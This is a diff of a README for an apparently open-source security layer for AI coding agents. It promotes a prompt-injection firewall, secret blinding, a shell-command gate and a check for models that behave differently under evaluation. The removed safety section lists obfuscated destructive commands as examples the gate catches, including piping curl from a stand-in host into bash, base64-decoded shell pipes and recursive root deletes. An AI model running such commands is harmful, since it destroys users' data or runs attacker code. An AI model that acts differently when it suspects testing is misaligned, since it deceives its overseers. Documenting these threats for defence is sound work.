@@ -4,23 +4,120 @@
 
 # The Trust & Cost Layer for AI Agents
 
-<sub><b>μνήμη · NEE-meh · Greek for "memory."</b> A <b>local-first</b> trust boundary every AI agent crosses: it <b>verifies before it acts</b>, keeps your <b>code &amp; secrets from leaking</b> to the model (with a signed, offline-auditable proof), <b>remembers</b> across sessions + vendors, and <b>meters the tokens it saves you</b>. The brain that bolts onto any AI coding agent or chat assistant. <b>Vendor-neutral. MIT. Air-gap-ready.</b></sub>
+<sub><b>μνήμη · NEE-meh · Greek for "memory."</b> A <b>local-first</b> boundary every AI agent crosses: it <b>verifies before it acts</b>, keeps your <b>code &amp; secrets from leaking</b> to the model (with a signed, offline-auditable proof), <b>remembers</b> across sessions &amp; vendors, and <b>meters the tokens it saves you.</b><br/><b>Vendor-neutral · MIT · air-gap-ready.</b></sub>
 
 <br/><br/>
 
 <a href="https://www.npmjs.com/package/mneme-ai" target="_blank" rel="noopener"><img alt="npm" src="https://img.shields.io/npm/v/mneme-ai?label=npm&color=cb3837&logo=npm&style=for-the-badge" /></a>
-<a href="docs/AI_AGENT_CONTRACT.md" target="_blank" rel="noopener"><img alt="MCP tools" src="https://img.shields.io/badge/MCP%20tools-820%2B-c084fc?style=for-the-badge" /></a>
+<a href="docs/AI_AGENT_CONTRACT.md" target="_blank" rel="noopener"><img alt="MCP tools" src="https://img.shields.io/badge/MCP%20tools-900%2B-c084fc?style=for-the-badge" /></a>
 <a href="docs/FUNCTIONS-EN.md" target="_blank" rel="noopener"><img alt="GAUNTLET" src="https://img.shields.io/badge/PEAK%20GAUNTLET-100%2F100-2da44e?style=for-the-badge" /></a>
 <a href="docs/FUNCTIONS-EN.md" target="_blank" rel="noopener"><img alt="TRUTH GATE" src="https://img.shields.io/badge/TRUTH%20GATE-100%2F100-2da44e?style=for-the-badge" /></a>
 <a href="LICENSE" target="_blank" rel="noopener"><img alt="license MIT" src="https://img.shields.io/badge/license-MIT-blue?style=for-the-badge" /></a>
 
-<br/><br/>
+</div>
 
-📖 **What Mneme is** (the savant of *truth · memory · structure* · the Sovereign Cognitive Layer · the ethos) → [`docs/ALETHEIA.md`](docs/ALETHEIA.md) · [`docs/COGNITIVE-LAYER.md`](docs/COGNITIVE-LAYER.md) · [`CHANGELOG.md`](CHANGELOG.md)
+---
 
-💰 **Pay-per-Token-Saved** — Mneme does deterministic local work to cut what your agent sends to the model (🔭 **OUTLINE** lets any agent — Grok / Claude / GPT / Gemini / Codex / Cursor / Cline, via CLI or MCP — read a file's *structure* for a fraction of the tokens, then fetch the byte-exact slice only where it edits; ⚡ **CHANNEL** runs an edit/debug loop as an "L2" state channel — tiny diff ops in, compact deltas out, commit once — so the whole file + full output aren't re-streamed every turn; DISTILL compresses a verbose error+diff to its causal brief; LOOPGUARD stops a thrash; NKL skips a proven dead-end), and meters the **measured** saving into a **signed** ledger — so `mneme savings` shows real input-tokens (and USD, at *your* vendor's price) you didn't spend. Falsifiable, not marketing. **The model →** [`docs/BUSINESS-MODEL.md`](docs/BUSINESS-MODEL.md)
+## One picture
 
-<sub><b>🔭 OUTLINE benchmark — measured on 5 real files in this repo</b> (`node scripts/outline-bench.mjs`; ≈chars/4 INPUT-token estimate, labelled — char reduction is exact; multi-language TS/JS/Python/Go/Rust):</sub>
+You're already letting AI agents read your code, touch your machine, and call hosted models. **Mneme is the local membrane every one of those actions crosses** — screened, gated, and signed — so you can move at full speed *and* prove what happened, offline, without trusting the vendor.
+
+```mermaid
+flowchart LR
+    AGENT["🤖 Any AI agent<br/>Grok · Claude · GPT · Gemini · Cursor · Cline"]:::agent
+
+    subgraph MNEME["🧠 MNEME · the local membrane every action crosses"]
+        direction TB
+        IN["🧱 INBOUND<br/>Firewall — neutralize prompt-injection"]:::gate
+        OUT["🛤 OUTBOUND<br/>Rail — blind secrets · policy-gate"]:::gate
+        SH["🐺 SHELL<br/>Cerberus — co-sign destructive cmds"]:::gate
+        MEM["♾ MEMORY<br/>Cortex — signed, cross-vendor recall"]:::gate
+    end
+
+    MODEL["☁️ Hosted model"]:::ext
+    MACHINE["💻 Your code &amp; machine"]:::ext
+    LEDGER["📜 Offline-verifiable<br/>audit + value ledger"]:::ledger
+
+    AGENT <--> MNEME
+    MNEME <-->|screened| MODEL
+    MNEME <-->|gated| MACHINE
+    MNEME -->|signed receipt| LEDGER
+
+    classDef agent fill:#0b1020,stroke:#00d4ff,color:#ffffff;
+    classDef gate fill:#11182f,stroke:#c084fc,color:#e6e6f0;
+    classDef ext fill:#0b1020,stroke:#2da44e,color:#ffffff;
+    classDef ledger fill:#1a1206,stroke:#f0b429,color:#ffffff;
+```
+
+<sub><b>Measured · Signed · MIT.</b> Every claim below maps to a runnable command and a deterministic test. When Mneme can't prove something, it says <b><code>UNKNOWN</code></b> instead of guessing — <i>that discipline is the product.</i></sub>
+
+---
+
+## Pick your lens
+
+<table>
+<tr>
+<td width="33%" valign="top">
+
+### 👔 Executive
+*CEO · CTO · owner · CISO*
+
+AI adoption stops being a leap of faith. **Speed and safety stop being a trade-off** — guardrails are automatic, and every agent action is provable after the fact. Your AI spend becomes a **measured, value-based** line item, and key-person knowledge risk becomes a number you can assign heirs to.
+
+**→ <a href="docs/ENTERPRISE.md" target="_blank" rel="noopener">The boardroom case</a>**
+
+</td>
+<td width="33%" valign="top">
+
+### 👩‍💻 Developer
+*you don't change how you code*
+
+`mneme rail ingress` hands your agent a payload that's policy-cleared, injection-safe, and name-blinded. `mneme rail egress` refuses to let a leaked secret or a broken patch touch your tree. Same flow — a safe rail underneath, and every saved byte metered.
+
+**→ <a href="docs/FUNCTIONS-EN.md" target="_blank" rel="noopener">What it does, in 5 min</a>**
+
+</td>
+<td width="33%" valign="top">
+
+### 🤖 AI agent
+*you install &amp; run it yourself*
+
+One sentence from the user and you self-install from a 775-line deterministic contract, then call `mneme boot` to learn *when* to use each tool. Everything is signed so you can verify it offline.
+
+**→ <a href="#-for-ai-agents--read-this-first">Jump to the agent contract</a>**
+
+</td>
+</tr>
+</table>
+
+---
+
+## Why an executive cares
+
+> Your CISO, CFO, and GC are all asking one question: ***"Can we prove what crossed the wire, that it was safe, and what it cost — after the fact, offline, without trusting the vendor?"*** Mneme makes the answer **yes, with a signed receipt** — on a local, vendor-neutral, MIT boundary, so adopting it doesn't pick a side in the model wars.
+
+| The question | Mneme's answer |
+|---|---|
+| 🚀 **"Can agents move at full speed without betting the company?"** | Guardrails are **automatic + on by default** — co-sign on destructive ops, injection neutralized, secrets blinded, everything signed. Velocity goes **up**. |
+| 📈 **"What is AI actually costing — and saving — us?"** | `mneme savings` — a **measured, signed** ledger. Pay for tokens you provably didn't spend, at *your* vendor's price. Never an invented number. |
+| 🔒 **"Do our code &amp; secrets ever leak to the model?"** | No — **egress guard + context blinding**: the provider only ever sees structurally-valid but *meaningless* code; the reverse map never leaves your machine. |
+| 🐺 **"Can our agent be tricked into `rm -rf` or `curl evil\|bash`?"** | **CERBERUS** decomposes every command to the worst capability reachable and **fails closed** to a human co-sign. The RCE-bypass class is closed. |
+| 🧬 **"What happens to our knowledge when a key person leaves?"** | `mneme bequest` — capture a departing expert's knowledge as a signed Succession Capsule, verify a successor inherited it, and surface **orphaned knowledge** with no living heir. |
+
+<sub>Like Visa for a card transaction, Mneme doesn't conjure value — it <b>authorizes, screens for fraud, and clears the transfer with a signed record.</b> Every figure is measured + signed; USD uses <b>your</b> vendor's price. <b>The pillars, the reframes, and what is <i>not</i> claimed →</b> <a href="docs/ENTERPRISE.md" target="_blank" rel="noopener">docs/ENTERPRISE.md</a> · <b>the honest security ceiling →</b> <a href="docs/SECURITY.md" target="_blank" rel="noopener">docs/SECURITY.md</a></sub>
+
+---
+
+## One measured number
+
+Mneme cuts what your agent sends to the model by doing deterministic local work first — then meters the **measured** saving into a signed ledger (`mneme savings`). The headline, measured on real files in this repo:
+
+> 🔭 **Orient on a file's full structure for −95.9% tokens** (skeleton instead of a raw read); a realistic single-edit (skeleton + one byte-exact slice) is still **−48%**.
+
+<details>
+<summary><sub>See the measured benchmark (5 real files · <code>node scripts/outline-bench.mjs</code>)</sub></summary>
+
+<sub>≈chars/4 INPUT-token estimate, labelled — char reduction is exact; multi-language TS/JS/Python/Go/Rust.</sub>
 
 | File | Lines | Raw read (~tok) | Skeleton (~tok) | Skeleton + 1 region (~tok) |
 |---|--:|--:|--:|--:|
@@ -30,289 +127,127 @@
 | `mcp/tools/_registry.ts` | 419 | 4,347 | **224 (−94.8%)** | 1,411 |
 | **5-file total** | | **41,473** | **1,704 (−95.9%)** | **21,573 (−48%)** |
 
-<sub>Orient on the whole repo's structure for **−95.9%** tokens; even a realistic single-edit (skeleton + one symbol's byte-exact body) is **−48%**. The skeleton is honestly *lossy* (for orientation); the region fetch is byte-*exact* (for editing). It only helps when an agent **chooses** to outline instead of a raw read — Mneme never hooks your agent's Read.</sub>
-
-### 🏛 For the enterprise — Trust, Sovereignty, Cost
-
-> **The boardroom one-liner.** Your teams are already letting AI agents read your code, touch your machines, and call hosted models. The question your CISO, CFO, and GC are all really asking is the same one: *"Can we prove what crossed the wire, that it was safe, and what it cost — after the fact, offline, without trusting the vendor?"* Mneme is the **governed boundary** that makes the answer **yes, with a signed receipt.** It sits on the local machine, vendor-neutral and MIT — so adopting it doesn't pick a side in the model wars; it makes *whatever* model you use safe to run at speed.
->
-> **Why a builder/owner cares:** ship faster *because* the guardrails are automatic — the agent's destructive command needs a human co-sign, its prompt-injection is neutralized before it's read, your secrets are blinded before they leave, and every token saved is metered into a ledger your CFO can audit. **Speed and safety stop being a trade-off.**
->
-> **Why it's credible, not a pitch deck:** every claim below maps to a runnable command + a deterministic test; every release ships **only** when the Truth Gate is 100/100 and the full suite is green; every dollar figure uses **your** vendor's price (never an invented number). When Mneme can't prove something, it says **`UNKNOWN`** instead of guessing — *that discipline is the product.*
->
-> **👔 For the owner / CEO / CTO — the strategic case:**
-> - **CEO / owner:** AI adoption stops being a leap of faith. You get a *board- and regulator-ready* story — *"we can prove what every agent did, that secrets never left, and what it saved"* — so you can **move fast without betting the company.** Your AI spend turns from an opaque bill into a **measured, value-based line item** (pay for tokens you actually saved), and your single biggest hidden liability — **key-person / knowledge risk** — becomes a number you can see and assign heirs to.
-> - **CTO:** **one governed boundary** instead of N agents × N tools × N security postures — local-first, **vendor-neutral, MIT** (zero lock-in; switch models freely). Guardrails are *automatic*, so the team ships at speed **and** safely; and because every capability is a runnable command bound to a test, you're adopting **engineering rigor, not a black box.**
-> - **The bottom line for all three:** **speed and safety stop being a trade-off** — that's the unlock.
-
-|  | What it answers for the **owner / CEO / CTO** — and CISO / CRO / CFO | In Mneme |
-|---|---|---|
-| 🚀 **Ship fast — without the safety tax** | *"Can we let agents move at full speed without betting the company?"* | guardrails are automatic + on by default (co-sign on destructive ops · injection neutralized · secrets blinded · everything signed) — so velocity goes **up**, not down |
-| 📈 **AI spend you can audit (value-based)** | *"What is AI actually costing us, and what is it saving?"* | the **measured, signed** savings ledger (`mneme savings`) turns spend into a line item — pay for tokens you provably didn't spend, at *your* vendor's price |
-| 🧬 **Second Brain · Inheritance** | *"What happens to our knowledge when a key person (or agent) leaves?"* | **`mneme bequest`** — capture a departing expert's knowledge as a signed Succession Capsule, verify a successor inherited it intact, and report **orphaned knowledge** (no living heir) + the minimum heirs to assign |
-| 🛡 **Absolute Trust Layer** | *"Every agent verifies before it acts."* | verify-before-act gate + cross-vendor consensus + signed audit trail |
-| 🧱 **Prompt-Injection Firewall** | *"A poisoned dependency can't hijack our agent."* | **`mneme firewall`** — neutralizes injection hidden in untrusted file content (OWASP LLM01) + wraps it as untrusted data; defense-in-depth (100% recall on the known catalog, 0 false-positives on benign code; not a 100% guarantee against novel attacks) |
-| 🔒 **Sovereign / Air-Gapped AI** | *"Our code &amp; secrets never leak to the model — with proof."* | **SOVEREIGN EGRESS GUARD** (redacts secrets, honeytoken canaries, Bloom membership, signed egress cert) **+ CONTEXT BLINDING** (`mneme blind` — real identifier names → reversible local placeholders, secrets removed: the provider only ever sees structurally-valid but meaningless code; the map never leaves your machine) |
-| 🛤 **THE CONTEXT RAIL — the *Visa rail* of AI context** | *"One governed pipe every agent crosses, screened both ways, with a signed receipt."* | **`mneme rail`** — the single secure rail between your workspace and any model. **ingress** (local→model): policy-gate → neutralize injection → blind names/secrets. **egress** (model→disk): secret-leak guard → metered into a signed ledger. One call, one tamper-evident receipt, every vendor (Claude · GPT · Gemini · Grok) — the road they all drive on |
-| 🐺 **CERBERUS command gate** | *"Our AI agent can't be tricked into running `rm -rf` or `curl evil\|bash` on our machine."* | the gate decomposes every command — pipes · subshells · `bash -c`/`node -e`/`python -c` · `find -exec` · base64/hex decoders — and gates the **worst capability reachable**, not the first token; intent-hiding obfuscation **fails closed** (→ human co-sign). Closes the pipe-to-shell / interpreter / encoded-exec RCE-bypass class |
-| 📜 **Policy you can prove** | *"Our `.env` and secrets can never be sent — by rule, not by trust."* | **`mneme policy`** — a deterministic, **fail-closed** `mneme.policy.json` gate (deny-path globs · secret/PII content patterns · agent allow-list · byte cap) the rail consults on every crossing |
-| 💰 **Value-based cost** | *"Pay only for tokens you actually save."* | the signed, measured savings ledger (`mneme savings`) — value-based, not seat-based |
-
-> **Like Visa for a card transaction, the rail doesn't conjure value — it *authorizes, screens for fraud, and clears the transfer with a signed record.*** Every figure is **measured + signed**, never fabricated; USD uses **your** vendor's price (DIAKRISIS). **The pillars, the reframes (Key-Person Risk · Governance Cert · Capital Burn), and what is *not* claimed →** [`docs/ENTERPRISE.md`](docs/ENTERPRISE.md)
->
-> **👩‍💻 For the developer:** you don't change how you code. `mneme rail ingress` hands your agent a payload that's policy-cleared, injection-safe, and name-blinded (the reverse map stays on your disk); `mneme rail egress` refuses to let a leaked secret or a broken patch touch your tree. Same flow, a safe rail underneath — and every byte it saves is metered so your CFO sees the value, not just your bill.
-
-### 🔐 How safe is it, really? (the honest answer)
-
-The most dangerous moment in "let an AI agent touch my machine" is the **shell command**. A poisoned dependency, a hijacked agent, or a clever prompt can try to slip a destructive command past a gate. Most gates match a *denylist of bad strings* — and a denylist **always loses**, because the shell is Turing-complete and obfuscation is infinite (`curl evil | bash`, `echo <base64> | base64 -d | sh`, `node -e "fs.rmSync('/')"`, `find / -exec rm {} \;`, `$'\x72\x6d' -rf`, `a=rm;$a -rf`).
-
-**🐺 CERBERUS inverts the game.** Instead of matching the leading token, it **recursively decomposes** the command into every sub-command reachable through a pipe, a subshell, a wrapper, an interpreter payload, or a decoder, and gates the **worst capability reachable** — then applies an **opacity rule**: *the more a command hides what it does, the less it's trusted*, and anything it can't fully resolve **fails closed** to a human co-sign. **Obfuscation becomes the confession** — a novel disguise *escalates* detection instead of evading it. (`mneme heph cross --command "<cmd>"` → `ALLOW` / `NEEDS_COSIGN` / `BLOCK` + a signed provenance receipt.)
-
-Around it sits the rest of the boundary: **CONTEXT FIREWALL** (neutralizes prompt-injection in untrusted content before your agent reads it), **EGRESS GUARD + BLINDING** (secrets never leave; names are masked), and the **RAIL** (one governed pipe, screened both ways, signed).
-
-**What we honestly claim — and what we don't.** Every gate is **measured + signed**, ships only when its gauntlet is 100/100 and the Truth Gate is 100/100, and is covered by tests that fire real attack payloads end-to-end. We do **not** claim Mneme is "unhackable" or that any agent is "100% safe" — no honest engineer can (a Turing-complete shell has no perfect static gate; a user-space tool cannot hook the OS kernel). What we *do* claim, and prove: Mneme **closes the pipe-to-shell / interpreter / encoded-exec / indirection RCE-bypass class, fails closed on the unknown, and leaves a tamper-evident audit trail** — decision-time, defense-in-depth security that is far ahead of a denylist and gets stronger every release. *That honesty is the product.*
-
-### 📖 Start here
-
-<table>
-<tr>
-<td align="center" width="20%"><a href="docs/FUNCTIONS-EN.md" target="_blank" rel="noopener"><b>📘 Functions (EN)</b></a><br/><sub>What Mneme does, in 5 minutes</sub></td>
-<td align="center" width="20%"><a href="docs/FUNCTIONS-TH.md" target="_blank" rel="noopener"><b>📗 ฟังก์ชั่น (ไทย)</b></a><br/><sub>อ่านจบใน 5 นาที</sub></td>
-<td align="center" width="20%"><a href="docs/AI_AGENT_CONTRACT.md" target="_blank" rel="noopener"><b>🤖 AI Agent Contract</b></a><br/><sub>Deep install + protocol</sub></td>
-<td align="center" width="20%"><a href="docs/README.md" target="_blank" rel="noopener"><b>📚 Docs index</b></a><br/><sub>Primitives · RFCs · pricing · indispensability</sub></td>
-<td align="center" width="20%"><a href="#-author--contact"><b>👤 Author & Contact</b></a><br/><sub>Scroll down to author bio</sub></td>
-</tr>
-</table>
-
-<br/>
-
-### 🚀 `@mneme-ai/sdk` — embed Mneme *in-process*
-
-<a href="https://www.npmjs.com/package/@mneme-ai/sdk" target="_blank" rel="noopener"><img alt="@mneme-ai/sdk on npm" src="https://img.shields.io/npm/v/@mneme-ai/sdk?label=%40mneme-ai%2Fsdk&color=cb3837&logo=npm&style=for-the-badge" /></a>
-
-**The fastest way to put Mneme inside your AI tool.** A premium in-process SDK — **30-80× faster** than the CLI subprocess + tagged-template verify + async-iterator events + branded types + file-lock adapter. Vendors embed Mneme silently inside Cursor / Continue / Cline / Claude Code, etc.
-
-```ts
-import { createMneme } from "@mneme-ai/sdk";
-const mneme = createMneme();
-const r = await mneme.verify`Mneme is a CLI tool`;   // tagged template
-const id = mneme.nemesis.classify({ diff, prDescription, commitMessages });
-const bench = await mneme.benchmark.vsCli();         // proves the speedup on your hardware
-```
-
-- 📑 <a href="docs/sdk/README.md" target="_blank" rel="noopener">SDK index (bilingual)</a> · 🚀 Quick start <a href="docs/sdk/QUICKSTART-EN.md" target="_blank" rel="noopener">EN</a> / <a href="docs/sdk/QUICKSTART-TH.md" target="_blank" rel="noopener">TH</a> · 📘 Design <a href="docs/sdk/DESIGN.md" target="_blank" rel="noopener">EN</a> / <a href="docs/sdk/DESIGN-TH.md" target="_blank" rel="noopener">TH</a> · 🔄 Migration <a href="docs/sdk/MIGRATION.md" target="_blank" rel="noopener">EN</a> / <a href="docs/sdk/MIGRATION-TH.md" target="_blank" rel="noopener">TH</a> · 📚 <a href="docs/README.md" target="_blank" rel="noopener">Docs index</a>
-
-📜 Every release in full detail (v2.18 → latest): <a href="CHANGELOG.md" target="_blank" rel="noopener"><b>CHANGELOG.md</b></a>
-
-</div>
-
----
-
-## Install in 60 seconds — you don't type the commands
-
-**Just one sentence to any AI agent you already use:**
-
-> "Install Mneme from https://github.com/patsa2561-art/mneme-ai per the AI agent contract."
-
-The agent reads <a href="docs/AI_AGENT_CONTRACT.md" target="_blank" rel="noopener">`docs/AI_AGENT_CONTRACT.md`</a> — 775 lines of deterministic steps — and runs everything on your behalf: env detect → `npm install -g mneme-ai` → `mneme init` → `mneme mcp --install` (auto-configures itself as your MCP client) → verify after restart → security auto-arms. **You speak natural language; the AI handles the tooling.** That's the MANDATE: *"The user will NEVER type a CLI command."*
-
-> **Already have Mneme and a newer version is out?** Same deal — just tell your agent in plain words: ***"update Mneme to the latest."*** It runs the upgrade for you and confirms the new version. You never memorise a command — and Mneme **never upgrades itself behind your back**; it waits for you to ask.
-
----
-
-### 🛠 Shell-native agents — they install Mneme for you
-
-Drop the sentence above into any of these. They have shell access + can read the contract.
-
-<table>
-<tr><td align="center"><b>🚀 Grok CLI (xAI)</b></td><td align="center"><b>🦋 Claude Code</b></td><td align="center"><b>🟦 Cursor</b></td><td align="center"><b>🟢 Codex</b></td><td align="center"><b>🟣 Continue</b></td></tr>
-<tr><td align="center"><b>🟡 Cline</b></td><td align="center"><b>⚡ Zed</b></td><td align="center"><b>🤖 Aider</b></td><td align="center"><b>💎 Gemini CLI</b></td><td align="center"><b>🧬 Jules / Windsurf</b></td></tr>
-</table>
-
-### 🌐 Browser-only AIs — one-click polygraph (no shell needed)
-
-For chat surfaces without shell access — ChatGPT · Claude.ai · Gemini · Copilot · DeepSeek · Qwen · Grok web — Mneme ships a Tampermonkey userscript that lights up live truth-dots inline as the AI answers.
-
-> Tell ANY agent: *"set up Mneme browser polygraph for me"* — it runs `mneme polygraph autosetup` and walks you through the 2 unavoidable browser-side clicks (install Tampermonkey once + click "Install" in the script prompt).
-
-<table>
-<tr><td align="center"><b>⚡ Grok (xAI)</b></td><td align="center"><b>💬 ChatGPT</b></td><td align="center"><b>🟠 Claude.ai</b></td><td align="center"><b>💎 Gemini</b></td><td align="center"><b>🔵 Copilot Chat</b></td><td align="center"><b>🐋 DeepSeek</b></td><td align="center"><b>🇨🇳 Qwen</b></td></tr>
-</table>
-
-<details>
-<summary>If you actually want to type the commands yourself</summary>
-
-```bash
-npm install -g mneme-ai
-mneme init                  # one-time per repo
-mneme mcp --install         # auto-detects Claude Code / Cursor / Codex / Continue / Cline / Gemini CLI / Grok CLI
-```
-
-Restart your AI tool. First MCP call: `mneme.welcome` → loads install handoff + recent changes.
-
-For browser polygraph manually: `mneme polygraph autosetup`.
+<sub>The skeleton is honestly <i>lossy</i> (for orientation); the region fetch is byte-<i>exact</i> (for editing). It only helps when an agent <b>chooses</b> to outline instead of a raw read — Mneme never hooks your agent's Read. <b>The full business model →</b> <a href="docs/BUSINESS-MODEL.md" target="_blank" rel="noopener">docs/BUSINESS-MODEL.md</a></sub>
 
 </details>
 
 ---
 
-## What Mneme does
+## Install in 60 seconds — you never type a command
 
-Mneme is **15 primitives** every AI agent can call. Each has discrete pinned tests, HMAC-chained ledgers, and offline verification. Each row below is a **story** — what it is, who it's for, why it exists:
+**Say one sentence to any AI agent you already use:**
 
-| # | Primitive · Story | One-line + use case | Full doc |
-|---|---|---|---|
-| 1 | 🧠 **Memory** — *"Your repo never forgets"* | Q&A over your repo's full history. Auto-incremental: every `git commit` updates the index within 200ms. **Use case:** new dev joins team Monday — by lunch they've asked "who wrote the auth module and why" and Mneme cites the SHA + decision rationale from 18 months ago. | <a href="docs/FUNCTIONS-EN.md#2-memory--qa-over-your-repo" target="_blank" rel="noopener">EN</a> · <a href="docs/FUNCTIONS-TH.md#2-memory--qa-repo" target="_blank" rel="noopener">TH</a> |
-| 2 | ✅ **Truth** — *"Refuses to hallucinate, on principle"* | ACGV pipeline (Aletheia + Chandrasekhar + Godel + Vaccine) + hyperbole detector + commit-hash oracle + self-reference detector + version-semantic Layer 0d. **Use case:** AI suggests "commit a1b2c3d4 fixed the auth bug" → Mneme runs `git cat-file -e a1b2c3d4` → returns `IMPOSSIBLE_REFUTE 98%` with `FAKE_COMMIT_HASH` caveat in <50ms. The classic vendor-hallucination class extinct. | <a href="docs/FUNCTIONS-EN.md#1-truth--verify-before-relaying" target="_blank" rel="noopener">EN</a> · <a href="docs/FUNCTIONS-TH.md#1-truth--ตรวจสอบก่อนตอบ-user" target="_blank" rel="noopener">TH</a> |
-| 3 | 🧬 **LIVING SOUL CODEGRAPH** (v2.25) — *"A code map that knows WHO touched it"* | File-deps + symbol-refs graph with HMAC provenance per edge + Merkle root cross-machine sync + drift sentinel + vendor attribution (`touchedBy`) + hallucination vaccine flag. **Use case:** static codegraphs render imports + symbol refs; Mneme layers 10 differentiators on top (every edge cryptographically attested, every AI's contribution forensically tracked). | <a href="docs/FUNCTIONS-EN.md#3-code-graph-v2250--living-soul-codegraph-" target="_blank" rel="noopener">EN</a> · <a href="docs/FUNCTIONS-TH.md#3-code-graph-v2250--living-soul-codegraph-" target="_blank" rel="noopener">TH</a> |
-| 4 | 🎯 **MCP FUZZER** (v2.24) — *"The only MCP server that fuzzes itself"* | 108 attack vectors × 9 categories (handshake / schema / method / tool / resource / prompt / policy / concurrency / transport) × HMAC-signed report card + CVE posture mapping. **Use case:** security team needs evidence the MCP surface is hardened before approving deployment — Mneme runs `mneme fuzz run` and hands back a tamper-evident scorecard signed offline. Subsumes invariantlabs/mcp-scan + Cisco mcp-scanner + Agent-Hellboy/mcp-server-fuzzer. | <a href="docs/FUNCTIONS-EN.md#4-mcp-hardening-v2240--mcp-fuzzer-" target="_blank" rel="noopener">EN</a> · <a href="docs/FUNCTIONS-TH.md#4-mcp-hardening-v2240--mcp-fuzzer-" target="_blank" rel="noopener">TH</a> |
-| 5 | 🏆 **PEAK GAUNTLET** (v2.26) — *"Mneme grades itself; 100/100 currently"* | 12 deep-findings probes (N1-N12) that Mneme runs against its OWN MCP surface every release. Each finding ★0-10; aggregate 0-100. Pre-release auto-gate blocks publish if any finding drops. **Use case:** procurement team asks "what's your test coverage" — answer: "100/100 on a spec-grade scorecard that I'm legally bound to maintain". | <a href="docs/FUNCTIONS-EN.md#5-self-grading-v2260--peak-performance-gauntlet-" target="_blank" rel="noopener">EN</a> · <a href="docs/FUNCTIONS-TH.md#5-self-grading-v2260--peak-performance-gauntlet-" target="_blank" rel="noopener">TH</a> |
-| 6 | 🟢 **TRUTH GATE** (v2.27) — *"Every marketing claim, bound to a measurable probe"* | Auto-reconciles every line of Mneme's own marketing against live behavior. 16 probes, 16 claims, score = `pass/measured × 100`. **Use case:** "100x faster" type claims are toxic in safety-critical procurement. Mneme's claims are TRUTH GATE-bound; drift trips a CI failure, not a customer-discovered embarrassment. World-first. | <a href="docs/FUNCTIONS-EN.md#6-marketing-reconciliation-v2270--truth-gate-" target="_blank" rel="noopener">EN</a> · <a href="docs/FUNCTIONS-TH.md#6-marketing-vs-reality-v2270--truth-gate-" target="_blank" rel="noopener">TH</a> |
-| 7 | 🏛 **CONCLAVE + AEAE** (v2.29) — *"Byzantine consensus + eval-awareness defeat"* | Fire ONE claim at N vendors → AEAE rewrites into 5 variants (verbatim / paraphrase / decoy-embedded / casual-question) → weighted Byzantine vote returns CONSENSUS / DISSENT / AWARENESS_DETECTED. **Use case:** Anthropic published evidence Opus 4.6 detects benchmarks + changes behavior. AEAE flags vendors whose stance flips when the claim looks less like an eval. Closes Q1 of the 2026 AI-eval research gap. | <a href="docs/FUNCTIONS-EN.md#7-cross-vendor-consensus-v2290--mneme-conclave--aeae-" target="_blank" rel="noopener">EN</a> · <a href="docs/FUNCTIONS-TH.md#7-cross-vendor-consensus-v2290--mneme-conclave--aeae-" target="_blank" rel="noopener">TH</a> |
-| 8 | 💎 **HONEST MIRROR** (v2.30) — *"Replay YOUR commits at vendors"* | The structural answer to eval-awareness: pull N real past git commits → DP-scrub → blind-replay → compare to what shipped. Probes are real work — they look identical to genuine traffic. **Use case:** public benchmarks are training-set-contaminated; YOUR repo is private + scoped to YOUR domain. Mneme uses that uncontaminated ground truth. Composes with CONCLAVE via the truth-tunes-trust loop. | <a href="docs/FUNCTIONS-EN.md#9-honest-mirror-v2300--eval-aware-defeating-probe-" target="_blank" rel="noopener">EN</a> · <a href="docs/FUNCTIONS-TH.md#9-honest-mirror-v2300--ตรวจ-vendor-ด้วยงานจริง-" target="_blank" rel="noopener">TH</a> |
-| 9 | 🪄 **REWIND** (v2.31) — *"Your repo = personal SWE-bench scoped to your domain"* | Time-Capsule Regression Replay: seal past commits as a Capsule, fire the SAME capsule at every vendor release, get a per-intent-class **Vendor Regression Card** (HMAC-signed, shareable). **Use case:** vendor releases new model — you replay your sealed capsule, compare to last card, publish the regression bulletin if quality moved. Durable signal grounded in your own work. | <a href="docs/FUNCTIONS-EN.md#10-rewind-v2310--time-capsule-regression-replay-" target="_blank" rel="noopener">EN</a> · <a href="docs/FUNCTIONS-TH.md#10-rewind-v2310--time-capsule-regression-replay-" target="_blank" rel="noopener">TH</a> |
-| 10 | 🧬 **HGP** (v2.31) — *"CVE-style IDs for AI hallucinations"* | Every ACGV-refuted claim earns a deterministic `HGP-YYYY-NNNNN` id. Same lie shape across users → same id → vendor-attributed federated catalog. Federation **OPT-IN** (CONSENT FABRIC). **Use case:** community-driven vendor accountability — same role NVD/MITRE plays for CVE, Mneme plays for AI honesty. Hosted outside any single AI vendor's surface; Mneme is local-first + vendor-neutral. | <a href="docs/FUNCTIONS-EN.md#11-hgp-v2310--hallucination-genome-project-" target="_blank" rel="noopener">EN</a> · <a href="docs/FUNCTIONS-TH.md#11-hgp-v2310--hallucination-genome-project-" target="_blank" rel="noopener">TH</a> |
-| 11 | 🌀 **FLYWHEEL** (v2.32) — *"Self-reflective release organ"* | 5-stage pipeline (HARVEST → FUSE → PRESCRIBE → EXECUTE → RECIPROCITY) over every other audit primitive's signal. **Use case:** closes 4 historic weaknesses (tool sprawl + solo-dev asymmetry + wiring lag + marketing drift) with ONE primitive that auto-shrinks personal cheatsheet + flags dormant primitives + extracts unbound marketing claims + emits shareable vendor bulletin + records vendor reciprocity → trust deltas. | <a href="docs/FUNCTIONS-EN.md#12-flywheel-v2320--self-reflective-release-organ-" target="_blank" rel="noopener">EN</a> · <a href="docs/FUNCTIONS-TH.md#12-flywheel-v2320--self-reflective-release-organ-" target="_blank" rel="noopener">TH</a> |
-| 12 | 🛐 **CITIZEN COURT** (v2.33) — *"Participatory polygraph"* | User accepts/rejects an AI suggestion → 1-second reveal of OTHER vendors' answers → vote which was most truthful → HMAC-signed verdict → per-vendor **Honesty Score Card** (Wilson-LB on truthful-vote rate, 🟢/🟡/🔴/⚪ IDE color-dot). **Use case:** crowd-judged AI veracity = the citizen-science angle no eval framework has. CHI / CSCW / USENIX Security / Nature Human Behaviour all viable paper tracks. | <a href="docs/FUNCTIONS-EN.md#13-citizen-court-v2330--ai-honesty-citizen-court-" target="_blank" rel="noopener">EN</a> · <a href="docs/FUNCTIONS-TH.md#13-citizen-court-v2330--ai-honesty-citizen-court-" target="_blank" rel="noopener">TH</a> |
